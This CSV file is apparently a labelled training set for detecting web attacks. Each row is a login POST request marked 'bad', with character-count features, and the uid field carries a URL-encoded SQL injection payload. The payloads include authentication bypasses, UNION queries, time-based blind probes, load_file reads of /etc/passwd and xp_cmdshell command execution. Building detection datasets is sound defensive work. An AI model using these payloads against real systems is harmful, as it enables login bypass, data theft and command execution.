method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
POST,/doLogin,uid=+union+select+*+from+users+where+login+%3D+char+...&passw=sc&btnSubmit=Login,0,0,0,0,10,0,0,0,0,8,78,3,bad
POST,/doLogin,uid=--sp_password&passw=sc&btnSubmit=Login,0,0,1,0,0,0,0,0,0,8,42,1,bad
POST,/doLogin,uid=0&passw=adf&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,31,1,bad
POST,/doLogin,uid=0+or+1%3D1&passw=ad&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,37,1,bad
POST,/doLogin,uid=0x730065006c0065006300740020004000400076006500+...a&passw=adc&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,81,1,bad
POST,/doLogin,uid=0x770061006900740066006F0072002000640065006C00+...&passw=sdfg&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,81,1,bad
POST,/doLogin,uid=0x77616974666F722064656C61792027303A303A313027+...&passw=g&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,78,1,bad
POST,/doLogin,uid=1%29%29+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=asf&btnSubmit=Login,0,0,0,2,2,0,0,0,0,8,64,1,bad
POST,/doLogin,uid=1%29%29+or+pg_sleep%28__TIME__%29--&passw=aef&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,57,2,bad
POST,/doLogin,uid=1%29%29+or+pg_sleep%28__TIME__%29--&passw=aefae&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,59,2,bad
POST,/doLogin,uid=1%29%29+or+sleep%28__TIME__%29%23&passw=SDEFSGE&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,57,2,bad
POST,/doLogin,uid=1%29%29+or+sleep%28__TIME__%29%23&passw=a&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,51,2,bad
POST,/doLogin,uid=1%29+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=sf&btnSubmit=Login,0,0,0,2,2,0,0,0,0,8,62,1,bad
POST,/doLogin,uid=1%29+or+pg_sleep%28__TIME__%29--&passw=asf&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,56,2,bad
POST,/doLogin,uid=1%29+or+pg_sleep%28__TIME__%29--&passw=zdc&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,56,2,bad
POST,/doLogin,uid=1%29+or+sleep%28__TIME__%29%23&passw=erwgt&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,54,2,bad
POST,/doLogin,uid=1%29+or+sleep%28__TIME__%29%23&passw=wf&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,51,2,bad
POST,/doLogin,uid=1%3B%28load_file%28char%2847%2C101%2C116%2C99%2C47%2C112%2C97%2C115%2C+...&passw=aef&btnSubmit=Login,0,0,0,3,1,0,1,0,0,8,80,1,bad
POST,/doLogin,uid=1+or+1%3D1&passw=ad&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,37,1,bad
POST,/doLogin,uid=1+or+benchmark%2810000000%2CMD5%281%29%29%23&passw=af&btnSubmit=Login,0,0,0,2,2,0,0,0,0,8,61,1,bad
POST,/doLogin,uid=1+or+pg_sleep%28__TIME__%29--&passw=as&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,54,2,bad
POST,/doLogin,uid=1+or+pg_sleep%28__TIME__%29--&passw=asfa&btnSubmit=Login,0,0,1,1,2,0,0,0,0,8,56,2,bad
POST,/doLogin,uid=1+or+sleep%28__TIME__%29%23&passw=admin&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,53,3,bad
POST,/doLogin,uid=1+or+sleep%28__TIME__%29%23&passw=afe&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,51,2,bad
POST,/doLogin,uid=1234+%22+AND+1%3D0+UNION+ALL+SELECT+%22admin%22%2C+&passw=asc&btnSubmit=Login,0,3,0,0,8,0,0,0,0,8,71,4,bad
POST,/doLogin,uid=1234+%27+AND+1%3D0+UNION+ALL+SELECT+%27admin%27%2C+&passw=asc&btnSubmit=Login,3,0,0,0,8,0,0,0,0,8,71,4,bad
POST,/doLogin,uid=21+%25&passw=af&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,33,1,bad
POST,/doLogin,uid=23+OR+1%3D1&passw=da&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=PRINT+%40%40variable&passw=afe&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,46,1,bad
POST,/doLogin,uid=a%27&passw=wd&btnSubmit=Login,1,0,0,0,0,0,0,0,0,8,31,1,bad
POST,/doLogin,uid=a%27+or+%27a%27+%3D+%27a&passw=jy&btnSubmit=Login,4,0,0,0,4,0,0,0,0,8,43,1,bad
POST,/doLogin,uid=a%27+or+1%3D1--&passw=jy&btnSubmit=Login,1,0,1,0,2,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=a%27+or+3%3D3--&passw=as&btnSubmit=Login,1,0,1,0,2,0,0,0,0,8,40,1,bad
POST,/doLogin,uid=a%27+waitfor+delay+%270%3A0%3A10%27--&passw=av&btnSubmit=Login,3,0,1,0,3,0,0,0,0,8,56,3,bad
POST,/doLogin,uid=a&passw=a&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,29,1,bad
POST,/doLogin,uid=admin%22%29+or+%221%22%3D%221%22%23&passw=a&btnSubmit=Login,0,5,0,0,2,0,0,0,0,8,47,2,bad
POST,/doLogin,uid=admin%22%29+or+%221%22%3D%221%22%2F*&passw=ac&btnSubmit=Login,0,5,0,0,2,0,0,0,0,8,49,2,bad
POST,/doLogin,uid=admin%22%29+or+%221%22%3D%221%22--&passw=sac&btnSubmit=Login,0,5,1,0,2,0,0,0,0,8,50,2,bad
POST,/doLogin,uid=admin%22%29+or+%221%22%3D%221&passw=as&btnSubmit=Login,0,4,0,0,2,0,0,0,0,8,46,2,bad
POST,/doLogin,uid=admin%22%29+or+%28%221%22%3D%221%22%23&passw=as&btnSubmit=Login,0,5,0,1,2,0,0,0,0,8,49,2,bad
POST,/doLogin,uid=admin%22%29+or+%28%221%22%3D%221%22%2F*&passw=ac&btnSubmit=Login,0,5,0,1,2,0,0,0,0,8,50,2,bad
POST,/doLogin,uid=admin%22%29+or+%28%221%22%3D%221%22--&passw=as&btnSubmit=Login,0,5,1,1,2,0,0,0,0,8,50,2,bad
POST,/doLogin,uid=admin%22%29+or+%28%221%22%3D%221&passw=asc&btnSubmit=Login,0,4,0,1,2,0,0,0,0,8,48,2,bad
POST,/doLogin,uid=admin%22+or+%221%22%3D%221%22%23&passw=asc&btnSubmit=Login,0,5,0,0,2,0,0,0,0,8,48,2,bad
POST,/doLogin,uid=admin%22+or+%221%22%3D%221%22%2F*&passw=ad&btnSubmit=Login,0,5,0,0,2,0,0,0,0,8,48,2,bad
POST,/doLogin,uid=admin%22+or+%221%22%3D%221%22--&passw=asc&btnSubmit=Login,0,5,1,0,2,0,0,0,0,8,49,2,bad
POST,/doLogin,uid=admin%22+or+%221%22%3D%221&passw=acs&btnSubmit=Login,0,4,0,0,2,0,0,0,0,8,46,2,bad
POST,/doLogin,uid=admin%22+or+1%3D1%23&passw=asc&btnSubmit=Login,0,1,0,0,2,0,0,0,0,8,44,2,bad
POST,/doLogin,uid=admin%22+or+1%3D1%2F*&passw=asc&btnSubmit=Login,0,1,0,0,2,0,0,0,0,8,45,2,bad
POST,/doLogin,uid=admin%22or+1%3D1+or+%22%22%3D%22&passw=asc&btnSubmit=Login,0,4,0,0,3,0,0,0,0,8,50,2,bad
POST,/doLogin,uid=admin%22or+1%3D1+or+%22%22%3D%22&passw=csac&btnSubmit=Login,0,4,0,0,3,0,0,0,0,8,51,2,bad
POST,/doLogin,uid=admin%27%29+or+%271%27%3D%271%27%23&passw=asc&btnSubmit=Login,5,0,0,0,2,0,0,0,0,8,49,2,bad
POST,/doLogin,uid=admin%27%29+or+%271%27%3D%271%27%2F*&passw=asc&btnSubmit=Login,5,0,0,0,2,0,0,0,0,8,50,2,bad
POST,/doLogin,uid=admin%27%29+or+%271%27%3D%271%27--&passw=as&btnSubmit=Login,5,0,1,0,2,0,0,0,0,8,49,2,bad
POST,/doLogin,uid=admin%27%29+or+%271%27%3D%271&passw=asc&btnSubmit=Login,4,0,0,0,2,0,0,0,0,8,47,2,bad
POST,/doLogin,uid=admin%27%29+or+%28%271%27%3D%271%27%23&passw=aasc&btnSubmit=Login,5,0,0,1,2,0,0,0,0,8,51,2,bad
POST,/doLogin,uid=admin%27%29+or+%28%271%27%3D%271%27%2F*&passw=asc&btnSubmit=Login,5,0,0,1,2,0,0,0,0,8,51,2,bad
POST,/doLogin,uid=admin%27%29+or+%28%271%27%3D%271%27--&passw=a&btnSubmit=Login,5,0,1,1,2,0,0,0,0,8,49,2,bad
POST,/doLogin,uid=admin%27%29+or+%28%271%27%3D%271&passw=ad&btnSubmit=Login,4,0,0,1,2,0,0,0,0,8,47,2,bad
POST,/doLogin,uid=admin%27%2F*&passw=sac&btnSubmit=Login,1,0,0,0,0,0,0,0,0,8,38,2,bad
POST,/doLogin,uid=admin%27+%23&passw=asc&btnSubmit=Login,1,0,0,0,1,0,0,0,0,8,38,2,bad
POST,/doLogin,uid=admin%27+--&passw=asc&btnSubmit=Login,1,0,1,0,1,0,0,0,0,8,39,2,bad
POST,/doLogin,uid=admin%27+or+%27&passw=sav&btnSubmit=Login,2,0,0,0,2,0,0,0,0,8,41,2,bad
POST,/doLogin,uid=admin%27+or+%271%27%3D%271%27%23&passw=ad&btnSubmit=Login,5,0,0,0,2,0,0,0,0,8,47,2,bad
POST,/doLogin,uid=admin%27+or+%271%27%3D%271%27%2F*&passw=ad&btnSubmit=Login,5,0,0,0,2,0,0,0,0,8,48,2,bad
POST,/doLogin,uid=admin%27+or+%271%27%3D%271%27%2F*&passw=zcd&btnSubmit=Login,5,0,0,0,2,0,0,0,0,8,49,2,bad
POST,/doLogin,uid=admin%27+or+%271%27%3D%271%27--&passw=ad&btnSubmit=Login,5,0,1,0,2,0,0,0,0,8,48,2,bad
POST,/doLogin,uid=admin%27+or+%271%27%3D%271&passw=ad&btnSubmit=Login,4,0,0,0,2,0,0,0,0,8,45,2,bad
POST,/doLogin,uid=admin%27+or+1%3D1%23&passw=adc&btnSubmit=Login,1,0,0,0,2,0,0,0,0,8,44,2,bad
POST,/doLogin,uid=admin%27+or+1%3D1%2F*&passw=adc&btnSubmit=Login,1,0,0,0,2,0,0,0,0,8,45,2,bad
POST,/doLogin,uid=admin%27+or+1%3D1&passw=sacd&btnSubmit=Login,1,0,0,0,2,0,0,0,0,8,44,2,bad
POST,/doLogin,uid=admin%27+or+1%3D1--&passw=adc&btnSubmit=Login,1,0,1,0,2,0,0,0,0,8,45,2,bad
POST,/doLogin,uid=admin%27or+1%3D1+or+%27%27%3D%27&passw=sacd&btnSubmit=Login,4,0,0,0,3,0,0,0,0,8,51,2,bad
POST,/doLogin,uid=and+1%3D%28+if%28%28load_file%28char%28110%2C46%2C101%2C120%2C11+...&passw=afe&btnSubmit=Login,0,0,0,5,3,0,0,0,0,8,78,1,bad
POST,/doLogin,uid=anything%27+OR+%27x%27%3D%27x&passw=d&btnSubmit=Login,4,0,0,0,2,0,0,0,0,8,47,1,bad
POST,/doLogin,uid=asc&passw=asf&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,33,1,bad
POST,/doLogin,uid=benchmark%2810000000%2CMD5%281%29%29%23&passw=ewfe&btnSubmit=Login,0,0,0,2,0,0,0,0,0,8,58,1,bad
POST,/doLogin,uid=benchmark%2810000000%2CMD5%281%29%29%23&passw=sfdaf&btnSubmit=Login,0,0,0,2,0,0,0,0,0,8,59,1,bad
POST,/doLogin,uid=char%254039%2541%252b%2540SELECT&passw=afe&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,54,2,bad
POST,/doLogin,uid=declare+%40q+nvarchar+%28200%29+select+%40q+%3D+&passw=sc&btnSubmit=Login,0,0,0,1,7,0,0,0,0,8,67,2,bad
POST,/doLogin,uid=declare+%40s+varchar%2822%29+select+%40s+%3D&passw=h&btnSubmit=Login,0,0,0,1,5,0,0,0,0,8,62,2,bad
POST,/doLogin,uid=declare+%40s+varchar%2822%29+select+%40s+%3D&passw=jhg&btnSubmit=Login,0,0,0,1,5,0,0,0,0,8,64,2,bad
POST,/doLogin,uid=declare+%40s+varchar+%28200%29+select+%40s+%3D+0x73656c6+...&passw=aef&btnSubmit=Login,0,0,0,1,8,0,0,0,0,8,80,2,bad
POST,/doLogin,uid=declare+%40s+varchar+%288000%29+select+%40s+%3D+0x73656c+...&passw=adc&btnSubmit=Login,0,0,0,1,8,0,0,0,0,8,80,2,bad
POST,/doLogin,uid=delete&passw=sfd&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,36,1,bad
POST,/doLogin,uid=desc&passw=ae&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,33,1,bad
POST,/doLogin,uid=distinct&passw=asc&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=eclare+%40s+varchar%28200%29+select+%40s+%3D+0x77616974+...&passw=af&btnSubmit=Login,0,0,0,1,7,0,0,0,0,8,78,2,bad
POST,/doLogin,uid=exec%28%40s%29&passw=hgf&btnSubmit=Login,0,0,0,1,0,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=exec+sp&passw=ad&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,36,1,bad
POST,/doLogin,uid=exec+xp&passw=dv&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,36,1,bad
POST,/doLogin,uid=having&passw=eqf&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,36,1,bad
POST,/doLogin,uid=hi%27%29+or+%28%27a%27%3D%27a&passw=sadf&btnSubmit=Login,4,0,0,1,2,0,0,0,0,8,46,1,bad
POST,/doLogin,uid=hi%27+or+%27a%27%3D%27a&passw=a&btnSubmit=Login,4,0,0,0,2,0,0,0,0,8,41,1,bad
POST,/doLogin,uid=hi%27+or+%27x%27%3D%27x%27%3B&passw=aef&btnSubmit=Login,5,0,0,0,2,0,1,0,0,8,45,1,bad
POST,/doLogin,uid=hi%27+or+1%3D1+--&passw=as&btnSubmit=Login,1,0,1,0,3,0,0,0,0,8,42,1,bad
POST,/doLogin,uid=hi+or+1%3D1+--%22&passw=saf&btnSubmit=Login,0,1,1,0,3,0,0,0,0,8,43,1,bad
POST,/doLogin,uid=hi+or+a%3Da&passw=a&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,37,1,bad
POST,/doLogin,uid=hi+or+a%3Da&passw=hi+or+a%3Da&btnSubmit=Login,0,0,0,0,4,0,0,0,0,8,45,1,bad
POST,/doLogin,uid=insert&passw=awfs&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,37,1,bad
POST,/doLogin,uid=like&passw=s&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,32,1,bad
POST,/doLogin,uid=limit&passw=awf&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,35,1,bad
POST,/doLogin,uid=or%25201%3D1+--&passw=a&btnSubmit=Login,0,0,1,0,1,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=or+%27%27%3D%27&passw=a&btnSubmit=Login,3,0,0,0,1,0,0,0,0,8,35,1,bad
POST,/doLogin,uid=or+%27%27%3D%27&passw=as&btnSubmit=Login,3,0,0,0,1,0,0,0,0,8,36,1,bad
POST,/doLogin,uid=or+%271%27%3D%271&passw=asf&btnSubmit=Login,3,0,0,0,1,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=or+%277659%27%3D%277659&passw=afd&btnSubmit=Login,3,0,0,0,1,0,0,0,0,8,45,1,bad
POST,/doLogin,uid=or+%27something%27+%3D+%27some%27%2B%27thing%27&passw=sad&btnSubmit=Login,6,0,0,0,3,0,0,0,0,8,61,1,bad
POST,/doLogin,uid=or+%27text%27+%3D+n%27text%27&passw=af&btnSubmit=Login,4,0,0,0,3,0,0,0,0,8,48,1,bad
POST,/doLogin,uid=or+%27unusual%27+%3D+%27unusual%27&passw=saf&btnSubmit=Login,4,0,0,0,3,0,0,0,0,8,54,1,bad
POST,/doLogin,uid=or+0%3D0+%23%22&passw=wef&btnSubmit=Login,0,1,0,0,2,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=or+0%3D0+%23&passw=da&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,37,1,bad
POST,/doLogin,uid=or+0%3D0+--&passw=ad&btnSubmit=Login,0,0,1,0,2,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=or+1%3D1%23&passw=asc&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,37,1,bad
POST,/doLogin,uid=or+1%3D1%2F*&passw=as&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,37,1,bad
POST,/doLogin,uid=or+1%3D1&passw=af&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,35,1,bad
POST,/doLogin,uid=or+1%3D1&passw=sca&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,36,1,bad
POST,/doLogin,uid=or+1%3D1+%2F*&passw=da&btnSubmit=Login,0,0,0,0,2,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=or+1%3D1+or+%22%22%3D&passw=asc&btnSubmit=Login,0,2,0,0,3,0,0,0,0,8,43,1,bad
POST,/doLogin,uid=or+1%3D1+or+%27%27%3D%27&passw=afe&btnSubmit=Login,3,0,0,0,3,0,0,0,0,8,44,1,bad
POST,/doLogin,uid=or+1%3D1--&passw=asf&btnSubmit=Login,0,0,1,0,1,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=or+1%3D1--&passw=jh&btnSubmit=Login,0,0,1,0,1,0,0,0,0,8,37,1,bad
POST,/doLogin,uid=or+1%3D1--+&passw=sac&btnSubmit=Login,0,0,1,0,2,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=or+1+in+%28select+%40%40version%29--&passw=asc&btnSubmit=Login,0,0,1,1,4,0,0,0,0,8,58,2,bad
POST,/doLogin,uid=or+a%3Da&passw=af&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,35,1,bad
POST,/doLogin,uid=or+a%3Da--&passw=gh&btnSubmit=Login,0,0,1,0,1,0,0,0,0,8,37,1,bad
POST,/doLogin,uid=or+a+%3D+a&passw=S&btnSubmit=Login,0,0,0,0,3,0,0,0,0,8,36,1,bad
POST,/doLogin,uid=or+isNULL%281%2F0%29+%2F*&passw=sdg&btnSubmit=Login,0,0,0,1,2,0,0,0,0,8,47,1,bad
POST,/doLogin,uid=or+pg_sleep%28__TIME__%29--&passw=asf&btnSubmit=Login,0,0,1,1,1,0,0,0,0,8,53,2,bad
POST,/doLogin,uid=or+sleep%28__TIME__%29%23&passw=hg&btnSubmit=Login,0,0,0,1,1,0,0,0,0,8,48,2,bad
POST,/doLogin,uid=or+sleep%28__TIME__%29%3D%27&passw=af&btnSubmit=Login,1,0,0,1,1,0,0,0,0,8,49,2,bad
POST,/doLogin,uid=or+username+like+char%2837%29%3B&passw=af&btnSubmit=Login,0,0,0,1,3,0,1,0,0,8,55,1,bad
POST,/doLogin,uid=order+by&passw=af&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,37,2,bad
POST,/doLogin,uid=password%3A*%2F%3D1--&passw=sac&btnSubmit=Login,0,0,1,0,0,0,0,0,0,8,45,1,bad
POST,/doLogin,uid=pg_sleep%28__TIME__%29--&passw=asf&btnSubmit=Login,0,0,1,1,0,0,0,0,0,8,50,2,bad
POST,/doLogin,uid=replace&passw=a&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,35,1,bad
POST,/doLogin,uid=select+*+from+information_schema.tables--&passw=kh&btnSubmit=Login,0,0,1,0,3,0,0,0,0,8,70,2,bad
POST,/doLogin,uid=select+name+from+syscolumns+where+id+%3D+%28sele+...&passw=asd&btnSubmit=Login,0,0,0,1,8,0,0,0,0,8,78,2,bad
POST,/doLogin,uid=t%27exec+master..xp_cmdshell+%27nslookup+www.googl+...&passw=ae&btnSubmit=Login,2,0,0,0,4,0,0,0,0,8,79,1,bad
POST,/doLogin,uid=t%27exec+master..xp_cmdshell+%27nslookup+www.google.com%27--&passw=ac&btnSubmit=Login,3,0,1,0,3,0,0,0,0,8,83,1,bad
POST,/doLogin,uid=truncate&passw=asf&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,38,1,bad
POST,/doLogin,uid=tz_offset&passw=asv&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,39,1,bad
POST,/doLogin,uid=uni%2F**%2Fon+sel%2F**%2Fect&passw=as&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,49,1,bad
POST,/doLogin,uid=union+select&passw=hgf&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,42,3,bad
POST,/doLogin,uid=union+select&passw=jyg&btnSubmit=Login,0,0,0,0,1,0,0,0,0,8,42,3,bad
POST,/doLogin,uid=union+select+1%2Cload_file%28%27%2Fetc%2Fpasswd%27%29%2C1%2C1%2C1%3B&passw=nh&btnSubmit=Login,2,0,0,1,2,0,1,0,0,8,75,3,bad
POST,/doLogin,uid=update&passw=ef&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,35,1,bad
POST,/doLogin,uid=x%27+AND+1%3D%28SELECT+COUNT%28*%29+FROM+tabname%29%3B+--&passw=as&btnSubmit=Login,1,0,1,2,6,0,1,0,0,8,72,2,bad
POST,/doLogin,uid=x%27+AND+email+IS+NULL%3B+--&passw=da&btnSubmit=Login,1,0,1,0,5,0,1,0,0,8,53,1,bad
POST,/doLogin,uid=x%27+AND+members.email+IS+NULL%3B+--&passw=af&btnSubmit=Login,1,0,1,0,5,0,1,0,0,8,61,1,bad
POST,/doLogin,uid=x%27+AND+userid+IS+NULL%3B+--&passw=ad&btnSubmit=Login,1,0,1,0,5,0,1,0,0,8,54,1,bad
POST,/doLogin,uid=x%27+OR+full_name+LIKE+%27%25Bob%25&passw=ac&btnSubmit=Login,2,0,0,0,4,0,0,0,0,8,56,1,bad
POST,/doLogin,uid=x%27+OR+full_name+LIKE+%27%25Bob%25&passw=sd&btnSubmit=Login,2,0,0,0,4,0,0,0,0,8,56,1,bad
POST,/doLogin,uid=x%27+or+1%3D1+or+%27x%27%3D%27y&passw=sac&btnSubmit=Login,4,0,0,0,4,0,0,0,0,8,49,1,bad
POST,/doLogin,uid=x+or+1%3D1+--&passw=adv&btnSubmit=Login,0,0,1,0,3,0,0,0,0,8,41,1,bad
